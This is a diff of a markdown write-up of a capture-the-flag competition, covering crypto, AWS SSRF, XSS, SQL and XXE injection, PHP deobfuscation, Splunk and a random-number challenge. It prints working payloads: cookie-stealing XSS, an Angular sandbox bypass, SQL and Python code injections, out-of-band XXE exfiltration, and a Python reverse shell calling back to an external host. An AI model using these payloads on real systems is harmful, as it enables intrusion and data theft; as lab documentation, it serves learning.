@@ -139,18 +139,30 @@ I tried a couple of options to crack the hash with `john the ripper` but in the 
 
 **Crypto 5** I could not figure this out. It looked like I needed to guess the 7byte key, and maybe even the IV. I don't know. I need to learn this!
 
-**Crypto 6** I used stegsolve to get the layer with the symbols visible. I needed to know what the font was, so I figured a google reverse image search should take me to the page where these esoteric fonts are defined. But no, everytime I uploaded as section of the font, google would take me to some page defining circles, arcs and tangents. I don't know for sure, but I think at some point some over enthusiastic engineer at google said, *hey you know what! I can train a model that can take an image and tell you what it is, then you can use that information to run a text search for that description. It will be so cool, we will change the world!* Anyways, that sucked. So I tried doing some programmy things, like I knew the the image had to say flag{xxxx_xx_xxxx} so I could map the symbols for f/l/a/g then get the english dictionary and search for words that start with *a* don't have *l* all that jazz, I tried that but still was left with a whole bunch of combinations. I could try all combinations, but that was taking too much time.
+**Crypto 6** I used stegsolve to get the layer with the symbols visible. I needed to know what the font was, so I figured a google reverse image search should take me to the page where these esoteric fonts are defined. But no, everytime I uploaded as section of the font, google would take me to some page defining circles, arcs and tangents.
+
+I don't know for sure, but I think at some point some over enthusiastic engineer at google said, 
+
+*hey you know what! I can train a model that can take an image and tell you what it is, then you can use that information to run a text search for that description. It will be so cool, we will change the world!* 
+
+Anyways, that sucked. So I tried doing some programmy things, like I knew the the image had to say flag{xxxx_xx_xxxx} so I could map the symbols for f/l/a/g then get the english dictionary and search for words that start with *a* don't have *l* all that jazz, I tried that but still was left with a whole bunch of combinations. I could try all combinations, but that was taking too much time.
 
 Snooping time, I looked up Ray and Steve on linked in, and went to their blogs. Yes I know, it is creepy. Long story short, I found the glyphs here https://medium.com/@stevemyrick/bsides-rdu-2019-eversec-ctf-writeup-4d2f5bfb8661.
 
 ### AWS
 I scanned the public buckets with the given prefix. I found a public bucket.
 I used the SSRF url to get to the bucket, I could have just used curl as well.
+
 ![system]./img/aws-1.png)
+
 user data is listed on this url from aws `http://169.254.169.254/latest/user-data` so the SSRF page should be able to get us the user data
+
 ![system]./img/aws-2.png)
+
 **AWS 3** needed some trial and error, so I downloaded the script locally and tried a bunch of combinations and was able to come up with this
+
 ![system]./img/aws-3.png)
+
 it uses the bytes.fromhex to slip through the html escaping.
 
 ### Stegnography
@@ -158,36 +170,58 @@ I was able to solve most of the stegnography challenges with strings,binwalk, an
 
 ### XSS
 XSS challenges had the IP's mentioned so that made it earier. These were the payloads for which I was able to claim the flags
+
 ```http://10.105.242.245/?q=%3Cscript%3Econsole.log(document.cookie);%3C/script%3E```
 ```<script>alert(document.cookie);</script>```
+
 Add events to the input text
+
 ```http://10.105.243.141/?value=%22%20onfocus=%22alert(document.cookie)%22%20autofocus=%22%22```
 ```" onfocus="alert(document.cookie)" autofocus=""```	
+
 The app was using templating and there was a reference to angular 1.4.7
 so I needed to bypass the angular sandbox. There was a known CVE for sandbox bypass for angular 1.4.7. Angular has since then droped the idea of sandboxes.
+
 ```http://10.105.242.92/?q={{%27i%27.constructor.prototype.charAt=%27b%27.concat;$eval(%27exploit=1}%20}%20};%20%20alert(document.cookie)//%27);}}```
 ```{{'i'.constructor.prototype.charAt='b'.concat;$eval('exploit=1} } };  alert(document.cookie)//');}}```
 
 ### Injection
 I was able to get SQL injection on `.210`
+
 ```curl -v -XPOST "http://10.105.243.210/login.php" --data-urlencode "username=admin" --data-urlencode "password= 1' OR '1' == '1"```
 ```flag{basic_sql_inj3cti0n}```
+
 **Injection 2/3** were variations of XML XEE vulnerabilities.
+
 Injection 2 was printing the value of `<name>` back on screen so, we can define a malicious DTD which will do the filesystem look up and put the value inside the `<name>` element.
+
 Injection 3 was a similar vulenerability with on catch, there was no value being echoed back to the client. The page simply said "registration successful". For this I needed to trigger an out-of-band execution. I don't have much experience with Burp Suite, but I believe that there is a way in which burp suite can help with OOB. Anyways, I did not try burp suite.
 I host my wife's we page. So I crafted this dtd and hosted it there
+
 ![system]./img/file-dtd.png)
+
 Then I posted this payload to the server
+
 ![system]./img/xml-oob.png)
+
 I got back the contents of `/flag.txt` in b64 encoded form, I was able to claim this flag.
+
 There was a python code injection which I managed to get the flag for as well
+
 ```eval("__import__('os').popen('cat /flag.txt').read()")```
+
 ![python](./img/injection-python.png)
+
 **Injection Ray** was fun!
+
 ![system]./img/injection-ray.png)
-Because of the Ray's devious sense of *fun* I was curious to see the code. So I got the source by passing this payload
+
+Because of the Ray's devious sense of *fun* I was curious to see the code. So I got the source by passing in this payload
+
 ```example.txt |  echo "aW5kZXgucGhwCg==" | base64 -d | xargs cat```
+
 Ray wasn't in the mood for making things easy. If you are wondering, this is what `index.php` looked like.
+
 ```
 $__='printf';$_='Loading Class/Code NAME';
  $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
@@ -198,8 +232,10 @@ $__________________='X19sYW1iZGE=';
 
         $___();$__________($______($__($_))); $________=$____();                                                                                                                                                   $________;
 ```
+
 As if that wasn't enough, the contents of the above code itself contained another block of gziped b64 encoded text. The function calls themselves were b64 encoded, but essentially the code was gunziping the b64 encoded content and then executing it.
-So I gunziped the content and decoded it to be greeted with this! God dammit Ray! :)
+So I gunziped the content and decoded it to be greeted with this! God dammit Ray!
+
 ```
         $____='printf';$___________='Class/Code NAME Class...';
 		$___                                                                            =                 'X19sYW1iZGE='     ;
@@ -210,7 +246,9 @@ $____='base64_decode';                                                          
                                                                                                            $______=$____($______);                                        $___=$____($___);                                  $_____=$___('$___',$______);
         $_____($____($___________));
 ```
-Finally, decoding the above b64 text gave the actual source
+
+Finally, decoding the above b64 text gave the actual source.
+
 ```php
 print("Please specify the name of the file to output via the filename GET parameter. For example: filename=example.txt");
 print("<p>");
@@ -274,18 +312,28 @@ if(isset($_GET['filename']))
 }
 ```
 All this for nothing.
+
 ### Employees
 I relied on `dirb` for employees api. Once I found the `/help` endpoint I tried creating some users.
 But the flags were at the `employees/id` and `employees/position` end points. There was also an `/admin?id=` endpoint but I wasn't able to get anywhere with that. I wasn't able to figure out **Employees 3**
+
 ![employees](./employees.png)
+
 ### Splunk
 Ok! this was hard. I had never used splunk before. I sort of knew what it did but had no first hand experience with it. My chances of getting these flags were slim. I reached out to my friend Sriram. He gave me a crash course on Splunk and some resources to learn the concepts. It appeared that Splunk exposed a REST endpoint on 8089. The default credentials `admin/changeme` did not work (obviously!) but sort of had an inking that the username was `admin`, so that was something. I figured we needed to guess the password.
+
 ![splunk](./img/splunk-1.png)
-I ran it and it against the 100k-most-used-passwords-NCSC.txt and got a hit for `admin/admin123`. I logged in, but no flag. I reached out to Steve (pestered him in the middle of the night) he asked me if I had claimed the flag on login. I had not. Steve bounced the machine and there it was! on the notifications list. Yay! my first flag. I fiddled around the UI a bit but could not make heads or tails. Time to study!
+
+I ran it and it against the 100k-most-used-passwords-NCSC.txt and got a hit for `admin/admin123`. I logged in, but no flag. I reached out to Steve (pestered him in the middle of the night) he asked me if I had claimed the flag on login. I had not. Steve bounced the machine and there it was! on the notifications list. 
+Yay! my first flag. I fiddled around the UI a bit but could not make heads or tails. Time to study!
+
 There was big red notification hint on the login page of Splunk. It linked to a page which spoke about RCE. I knew that was what was needed.
 This was the reverse shell. I first tried getting the shell locally.
+
 ```socat `tty`,raw,echo=0 tcp-listen:8080```
+
 and ran 
+
 ```
 kali@kali:~/splunk/app$ cat bin/shell.py
 import sys,socket,os,pty
@@ -298,9 +346,13 @@ s.connect((ip,int(port)))
 pty.spawn('/bin/bash')
 ```
 I got a shell. I packaged the tar and uploaded it to splunk and waited. No shell. I figured there was something blocking traffic from splunk to the kali box. So I spun up a linode instance on my personal account, and had `socat` listen on 80.
+
 `socat `tty`,raw,echo=0 tcp-listen:80`
+
 I updated the IP in the script and uploaded the app to splunk and waited. I hoped that the firewall won't block traffic going out to the internet on port 80. 30 seconds latter! SHELL!
+
 One flag was readable as the splunk user the other was not. But thankfully, splunk user was on the sudoers list and I was able to claim both flags.
+
 ```
 flag{welcome_shell}
 flag{you_made_it}
@@ -310,9 +362,12 @@ I did not think I was going to be claiming the splunk flags! I guess I got lucky
 ### Random
 This challenge took me 3 days to figure out that I was wrong all along.
 The API was simple, there was a `/random` endpoint. You claimed a flag if you guessed the next random number ranging from 0 to 1000.
-The API was in python so I figured that the implementation was a "Mersenne Twister" and that the challenge was to guess the state of the random object so that we can predict the next. Boy was I wrong!
+The API was in python so I figured that the implementation was a **"Mersenne Twister"** and that the challenge was to guess the state of the random object so that we can predict the next. Boy was I wrong!
+
 First off, I had been overcomplicating this. But in the end I learnt about "Mersenne Twister", internal random state. I spoke to Steve about the challenge to ask him if I was going down a rabbit hole. He said I was overcomplicating it. :) tru dat!
+
 Once I was able to wind back, I thought in terms of, what are the chances of two random number generators generating the same number between 0 and 1000. So if I tried enought number of times I was bound to get a collision. So then I came up with this.
+
 ![random](./img/random.png)
 
 ## Wrapup
